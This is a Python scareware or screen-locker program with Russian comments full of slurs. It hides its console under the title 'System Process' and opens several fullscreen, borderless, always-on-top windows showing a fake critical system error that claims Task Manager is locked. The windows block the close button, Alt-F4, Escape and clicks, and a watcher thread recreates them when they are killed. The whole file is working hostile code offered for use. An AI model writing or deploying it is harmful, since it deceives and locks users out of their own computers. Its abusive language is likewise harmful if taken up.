import tkinter as tk
import threading
import time
import ctypes
import os
import sys
import subprocess

# защита от закрытия через диспетчер, гнида
def protect_process():
    try:
        # делаем процесс системным, пидор
        ctypes.windll.kernel32.SetConsoleTitleW("System Process")
        # скрываем окно консоли, мразь
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# функция которая перезапускает окно если его убили, сука
def window_watcher():
    while True:
        try:
            # проверяем существует ли окно, блядь
            import pygetwindow as gw
            windows = gw.getWindowsWithTitle('СИСТЕМНОЕ СООБЩЕНИЕ')
            if len(windows) == 0:
                # если окно убили - создаем новое, пидор
                create_uncloseable_window()
        except:
            create_uncloseable_window()
        time.sleep(0.5)

def create_uncloseable_window():
    # создаем окно которое ебется, блядь
    root = tk.Tk()
    root.title("СИСТЕМНОЕ СООБЩЕНИЕ")
    root.geometry("500x200+500+300")
    
    # делаем окно поверх всех и полноэкранным иногда, сука
    root.attributes('-topmost', True)
    root.attributes('-fullscreen', True)  # нахуй полный экран, мразь
    
    # блокируем все хуйни, гнида
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # крестик нахуй
    root.bind('<Alt-F4>', lambda e: 'break')  # alt+f4 нахуй
    root.bind('<Escape>', lambda e: 'break')  # escape нахуй
    root.bind('<Control-Alt-Delete>', lambda e: 'break')  # ctrl+alt+del пробуем блокировать
    
    # убираем рамку окна чтоб нельзя было переместить, тварь
    root.overrideredirect(True)  # вообще без рамок, сука
    
    # текст, падла
    label = tk.Label(
        root, 
        text="⚠️ СИСТЕМНАЯ ОШИБКА ⚠️\n\n"
             "ОБНАРУЖЕН КРИТИЧЕСКИЙ СБОЙ\n"
             "ВЫКЛЮЧЕНИЕ НЕВОЗМОЖНО\n\n"
             "ПЕРЕЗАГРУЗИТЕ КОМПЬЮТЕР\n"
             "ДИСПЕТЧЕР ЗАДАЧ ЗАБЛОКИРОВАН\n\n"
             "Это не вирус, сука, это системное сообщение",
        font=("Arial", 16, "bold"),
        fg="red",
        bg="black",
        justify="center"
    )
    label.pack(expand=True, fill='both')
    
    # делаем чтоб окно не реагировало на клики, мразь
    label.bind('<Button-1>', lambda e: 'break')
    
    try:
        root.mainloop()
    except:
        pass

# главный пиздец, блядь
if __name__ == "__main__":
    # защищаем процесс, сука
    protect_process()
    
    # запускаем несколько окон, пидор
    for i in range(3):
        thread = threading.Thread(target=create_uncloseable_window, daemon=True)
        thread.start()
    
    # запускаем наблюдатель который будет перезапускать окна, гнида
    watcher = threading.Thread(target=window_watcher, daemon=True)
    watcher.start()
    
    # держим проц живым и доставляем пиздец, сука
    while True:
        try:
            # периодически меняем размер и позицию окон, чтоб заебало, мразь
            time.sleep(5)
        except:
            pass